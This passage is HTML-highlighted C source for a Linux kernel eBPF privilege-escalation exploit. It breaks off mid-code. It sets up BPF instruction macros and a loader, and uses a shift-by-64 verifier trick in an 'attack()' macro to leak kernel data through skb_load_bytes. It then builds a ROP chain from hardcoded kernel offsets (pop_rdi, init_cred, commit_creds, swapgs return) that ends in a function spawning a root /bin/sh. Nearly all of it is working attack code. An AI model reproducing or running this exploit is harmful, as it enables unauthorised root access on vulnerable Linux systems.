class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out, <span class="keyword">char</span> *write_buf, <span class="keyword">size_t</span> write_nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_nbytes != write(socks[<span class="number">1</span>], write_buf, write_nbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] write not so good\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack()                                    \</span></span><br><span class="line"><span class="meta">    BPF_MOV64_IMM(BPF_REG_9, 64),                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">leak_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">16</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0xFF</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(leak_insn, <span class="keyword">sizeof</span>(leak_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, buf, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        save_status();</span><br><span class="line">        signal(SIGSEGV, &amp;get_shell);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_offset + <span class="number">0xffffffff810d7210</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = kernel_offset + <span class="number">0xffffffff82e6e860</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = kernel_offset + <span class="number">0xffffffff81097050</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = kernel_offset + <span class="number">0xffffffff81e0100b</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">        rop_chain[i++] = init_cred;</span><br><span class="line">        rop_chain[i++] = commit_creds;</span><br><span class="line">        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = &amp;get_shell;</span><br><span class="line">        rop_chain[i++] = user_cs;</span><br><span class="line">        rop_chain[i++] = user_rflags;</span><br><span class="line">        rop_chain[i++] = user_sp;</span><br><span class="line">        rop_chain[i++] = user_ss;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">attack_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">0x100</span> - <span class="number">8</span>)),</span><br><span class="line">            